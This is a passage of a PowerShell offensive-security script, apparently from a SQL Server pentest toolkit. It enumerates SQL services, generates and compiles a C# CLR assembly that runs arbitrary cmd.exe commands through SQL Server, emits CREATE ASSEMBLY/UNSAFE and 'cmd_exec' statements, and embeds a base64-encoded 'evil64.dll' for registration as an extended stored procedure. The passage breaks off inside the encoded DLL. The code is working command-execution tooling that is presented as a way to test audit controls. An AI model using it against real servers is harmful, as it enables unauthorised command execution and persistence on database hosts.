            SQLServer1     SQL Full-text Filter Daemon Launcher (STANDARDDEV2014) MSSQLFDLauncher$STANDARDDEV2014          "C:\Program Files\Microsoft SQL Server\MSSQL12.STANDARDD...
            SQLServer1     SQL Server (MSSQLSERVER)                               MSSQLSERVER                              "C:\Program Files\Microsoft SQL Server\MSSQL12.MSSQLSERV...
            SQLServer1     SQL Server Analysis Services (MSSQLSERVER)             MSSQLServerOLAPService                   "C:\Program Files\Microsoft SQL Server\MSAS12.MSSQLSERVE...
            SQLServer1     SQL Server Reporting Services (MSSQLSERVER)            ReportServer                             "C:\Program Files\Microsoft SQL Server\MSRS12.MSSQLSERVE...
            SQLServer1     SQL Server Reporting Services (SQLEXPRESS)             ReportServer$SQLEXPRESS                  "C:\Program Files\Microsoft SQL Server\MSRS12.SQLEXPRESS...
            SQLServer1     SQL Server Reporting Services (STANDARDDEV2014)        ReportServer$STANDARDDEV2014             "C:\Program Files\Microsoft SQL Server\MSRS12.STANDARDDE...
            SQLServer1     SQL Server Distributed Replay Client                   SQL Server Distributed Replay Client     "C:\Program Files (x86)\Microsoft SQL Server\120\Tools\D...
            SQLServer1     SQL Server Distributed Replay Controller               SQL Server Distributed Replay Controller "C:\Program Files (x86)\Microsoft SQL Server\120\Tools\D...
            SQLServer1     SQL Server Agent (SQLEXPRESS)                          SQLAgent$SQLEXPRESS                      "C:\Program Files\Microsoft SQL Server\MSSQL12.SQLEXPRES...
            SQLServer1     SQL Server Agent (STANDARDDEV2014)                     SQLAgent$STANDARDDEV2014                 "C:\Program Files\Microsoft SQL Server\MSSQL12.STANDARDD...
            SQLServer1     SQL Server Browser                                     SQLBrowser                               "C:\Program Files (x86)\Microsoft SQL Server\90\Shared\s...
            SQLServer1     SQL Server Agent (MSSQLSERVER)                         SQLSERVERAGENT                           "C:\Program Files\Microsoft SQL Server\MSSQL12.MSSQLSERV...
            SQLServer1     SQL Server VSS Writer                                  SQLWriter                                "C:\Program Files\Microsoft SQL Server\90\Shared\sqlwrit...
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance.')]
        [string]$Instance,
       [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Filter for running services.')]
        [switch]$RunOnly,
                [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        # Table for output
        $TblLocalInstances = New-Object -TypeName System.Data.DataTable
        $null = $TblLocalInstances.Columns.Add('ComputerName')
        $null = $TblLocalInstances.Columns.Add('Instance')
        $null = $TblLocalInstances.Columns.Add('ServiceDisplayName')
        $null = $TblLocalInstances.Columns.Add('ServiceName')
        $null = $TblLocalInstances.Columns.Add('ServicePath')
        $null = $TblLocalInstances.Columns.Add('ServiceAccount')
        $null = $TblLocalInstances.Columns.Add('ServiceState')
        $null = $TblLocalInstances.Columns.Add('ServiceProcessId')
    }

    Process
    {
        # Grab SQL Server services based on file path
        $SqlServices = Get-WmiObject -Class win32_service |
        Where-Object -FilterScript {
            $_.pathname -like '*Microsoft SQL Server*'
        } |
        Select-Object -Property DisplayName, PathName, Name, StartName, State, SystemName, ProcessId

        # Add records to SQL Server instance table
        $SqlServices |
        ForEach-Object -Process {
        
            # Parse Instance
            $ComputerName = [string]$_.SystemName
            $DisplayName = [string]$_.DisplayName
            $ServState = [string]$_.State

            # Set instance to computername by default
            $CurrentInstance = $ComputerName

            # Check for named instance
            $InstanceCheck = ($DisplayName[1..$DisplayName.Length] | Where-Object {$_ -like '('}).count
            if($InstanceCheck) {

                # Set name instance
                $CurrentInstance = $ComputerName + '\' +$DisplayName.split('(')[1].split(')')[0]

                # Set default instance
                if($CurrentInstance -like '*\MSSQLSERVER')
                {
                    $CurrentInstance = $ComputerName
                }
            }
          
            # If an instance is set filter out service that dont apply
            if($Instance -and $instance -notlike $CurrentInstance){
                return
            }

            # Filter out services that arent runn if needed
            if($RunOnly -and $ServState -notlike 'Running'){
                return    
                
            }
            
            # Setup process id
            if($_.ProcessId -eq 0){
                $ServiceProcessId = ""
            }else{
                $ServiceProcessId = $_.ProcessId
            }

            # Add row
            $null = $TblLocalInstances.Rows.Add(
                [string]$_.SystemName,
                [string]$CurrentInstance,
                [string]$_.DisplayName,
                [string]$_.Name,
                [string]$_.PathName,
                [string]$_.StartName,
                [string]$_.State,
                [string]$ServiceProcessId)            
        }
    }

    End
    {
        # Status User
        $LocalInstanceCount = $TblLocalInstances.rows.count

        if(-not $SuppressVerbose){
            Write-Verbose "$LocalInstanceCount local SQL Server services were found that matched the criteria."        
        }

        # Return data
        $TblLocalInstances 
    }
}


# -------------------------------------------
# Function:  Create-SQLFilCLRDLL
# -------------------------------------------
function Create-SQLFileCLRDll
{
    <#
            .SYNOPSIS
            This script can be used to create a CLR DLL to execute OS commands through SQL Server.  It will
            also generate a CREATE ASSEMBLY command that can be used to create an assembly and function without
            requiring the DLL.
            .NOTES
            https://msdn.microsoft.com/en-us/library/microsoft.sqlserver.server.sqlpipe.sendresultsrow(v=vs.110).aspx
            http://sekirkity.com/seeclrly-fileless-sql-server-clr-based-custom-stored-procedure-command-execution/
            https://msdn.microsoft.com/en-us/library/ms254498(v=vs.110).aspx
    #>

    [CmdletBinding()]
    Param(

        [Parameter(Mandatory = $false,
        HelpMessage = 'Operating system command to run.')]
        [string]$Command,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Procedure name.')]
        [string]$ProcedureName = "cmd_exec",  

        [Parameter(Mandatory = $false,
        HelpMessage = 'Directory to output files.')]
        [string]$OutDir = $env:temp,  

        [Parameter(Mandatory = $false,
        HelpMessage = 'Output file name.')]
        [string]$OutFile = "CLRFile"              
    )

    Begin
    {

        # ------------------------------------
        # Setup File Paths
        # ------------------------------------
        $SRCPath = $OutDir + '\' + $OutFile + '.csc'
        $DllPath = $OutDir + '\' + $OutFile + '.dll'
        $CommandPath = $OutDir + '\' + $OutFile + '.txt'
    }

    Process 
    {

        # Create c# teamplate that will run any provided command
        # Based on template from http://sekirkity.com/seeclrly-fileless-sql-server-clr-based-custom-stored-procedure-command-execution/
        $TemplateCmdExec = @"
        using System;
        using System.Data;
        using System.Data.SqlClient;
        using System.Data.SqlTypes;
        using Microsoft.SqlServer.Server;
        using System.IO;
        using System.Diagnostics;
        using System.Text;
        public partial class StoredProcedures
        {
        [Microsoft.SqlServer.Server.SqlProcedure]
        public static void $ProcedureName (SqlString execCommand)
        {
        Process proc = new Process();
        proc.StartInfo.FileName = @"C:\Windows\System32\cmd.exe";
        proc.StartInfo.Arguments = string.Format(@" /C {0}", execCommand.Value);
        proc.StartInfo.UseShellExecute = false;
        proc.StartInfo.RedirectStandardOutput = true;
        proc.Start();

            // Create the record and specify the metadata for the columns.
	        SqlDataRecord record = new SqlDataRecord(new SqlMetaData("output", SqlDbType.NVarChar, 4000));

	        // Mark the begining of the result-set.
	        SqlContext.Pipe.SendResultsStart(record);

            // Set values for each column in the row
	        record.SetString(0, proc.StandardOutput.ReadToEnd().ToString());

	        // Send the row back to the client.
	        SqlContext.Pipe.SendResultsRow(record);

	        // Mark the end of the result-set.
	        SqlContext.Pipe.SendResultsEnd();

        proc.WaitForExit();
        proc.Close();

        }
        };
"@

        # Setup output file paths
        Write-Verbose "Writing source code to $SRCPath" 
        $TemplateCmdExec | Out-File $SRCPath

        # Identify csc path
        Write-Verbose "Locating csc.exe" 
        $CSCPath = Get-ChildItem -Recurse "C:\Windows\Microsoft.NET\" -Filter "csc.exe" | Sort-Object fullname -Descending | Select-Object fullname -First 1 -ExpandProperty fullname
        if(-not $CSCPath){
            Write-Output "No csc.exe found."
            return
        }

        # Compile binary
	$CurrentDirectory = pwd
	cd $OutDir
        $Command = "$CSCPath /target:library " + $SRCPath        
        Write-Verbose "Compiling $SRCPath to $DllPath" 
        write-verbose "Command: $Command"
        $Results = Invoke-Expression $Command
	cd $CurrentDirectory

        # Read and encode file
        Write-Verbose "Grabbing bytes from the dll" 
        $stringBuilder = New-Object -Type System.Text.StringBuilder
        $stringBuilder.Append("create assembly [") > $null
        $stringBuilder.Append($ProcedureName) > $null
        $stringBuilder.Append("] AUTHORIZATION [dbo] from `n0x") > $null
        $assemblyFile = resolve-path $DllPath
        $fileStream = [IO.File]::OpenRead($assemblyFile)
         while (($byte = $fileStream.ReadByte()) -gt -1) {
            $stringBuilder.Append($byte.ToString("X2")) > $null
        }
        $stringBuilder.Append("`n with permission_set = UNSAFE")
        $stringBuilder.Append(" GO")
        $stringBuilder.Append(" CREATE PROCEDURE [dbo].[$ProcedureName] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [$ProcedureName].[StoredProcedures].[$ProcedureName];")
        $stringBuilder.Append(" GO")
        $stringBuilder.Append(" EXEC[dbo].[cmd_exec] 'whoami'")        
        $stringBuilder.Append(" GO")
        $MySQLCommand = $stringBuilder.ToString() -join ""
        $fileStream.Close()
        $fileStream.Dispose()

        # Generate SQL Command - note: this needs to be join together to work
        Write-Verbose "Writing CREATE ASSEMBLY command using DLL bytes to $CommandPath"
        $MySQLCommand | Out-File $CommandPath 

        # Status user
        Write-Output "Source: $SRCPath"
        Write-Output "DLL: $DllPath"
        Write-Output "SQL Command: $CommandPath"
    }
    
    End 
    {
    }
}


# -------------------------------------------
# Function:  Create-SQLFileXpDll
# -------------------------------------------
function Create-SQLFileXpDll
{
    <#
            .SYNOPSIS
            This script can be used to generate a DLL file with an exported function that can be registered as an
            extended stored procedure in SQL Server.  The exported function can be configured to run any
            Windows command.  This script is intended to be used to test basic SQL Server audit controls around
            the sp_addextendedproc and sp_dropextendedproc stored procedures used to register and unregister
            extended stored procedures.
            .PARAMETER ExportName
            Name of the exported function that will be created.
            .PARAMETER Command
            Operating system command that the exported function will run.
            .PARAMETER OutFile
            Name of the Dll file to write to.
            .EXAMPLE
            PS C:\temp> Create-SQLFileXpDll -OutFile c:\temp\test.dll -Command "echo test > c:\temp\test.txt" -ExportName xp_test

            Creating DLL c:\temp\test.dll
            - Exported function name: xp_test
            - Exported function command: "echo test > c:\temp\test.txt"
            - DLL written
            - Manual test: rundll32 c:\temp\test.dll,xp_test

            SQL Server Notes
            The exported function can be registered as a SQL Server extended stored procedure. Options below:
            - Register xp via local disk: sp_addextendedproc 'xp_test', 'c:\temp\myxp.dll'
            - Register xp via UNC path: sp_addextendedproc 'xp_test', '\\servername\pathtofile\myxp.dll'
            - Unregister xp: sp_dropextendedproc 'xp_test'
            .LINK
            http://en.cppreference.com/w/cpp/utility/program/system
            http://www.netspi.com

            .NOTES
            The extended stored procedure template used to create the DLL shell was based on the following stackoverflow post:
            http://stackoverflow.com/questions/12749210/how-to-create-a-simple-dll-for-a-custom-sql-server-extended-stored-procedure

            Modified source code used to create the DLL can be found at the link below:
            https://github.com/nullbind/Powershellery/blob/master/Stable-ish/MSSQL/xp_evil_template.cpp

            The method used to patch the DLL was based on Will Schroeder "Invoke-PatchDll" function found in the PowerUp toolkit:
            https://github.com/HarmJ0y/PowerUp
    #>

    [CmdletBinding()]
    Param(

        [Parameter(Mandatory = $false,
        HelpMessage = 'Operating system command to run.')]
        [string]$Command,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Name of exported function.')]
        [string]$ExportName,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Dll file to write to.')]
        [string]$OutFile
    )

    # -----------------------------------------------
    # Define the DLL file and command to be executed
    # -----------------------------------------------

    # This is the base64 encoded evil64.dll -command: base64 -w 0 evil64.dll > evil64.dll.b64
    $DllBytes64 = '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zMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMxAVVdIgezIAAAASIvsSIv8uTIAAAC4zMzMzPOruAEAAABIjaXIAAAAX13DzMzMzMzMzMzMzMzMzMzMzMzMzMzMSIlMJAhVV0iB7MgAAABIi+xIi/y5MgAAALjMzMzM86tIi4wk6AAAAEiNpcgAAABfXcPMzMzMzMzMzMzMzMzMzEiJVCQQSIlMJAhVV0iB7MgAAABIi+xIi/y5MgAAALjMzMzM86tIi4wk6AAAAEiNpcgAAABfXcPMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMTIlEJBiJVCQQSIlM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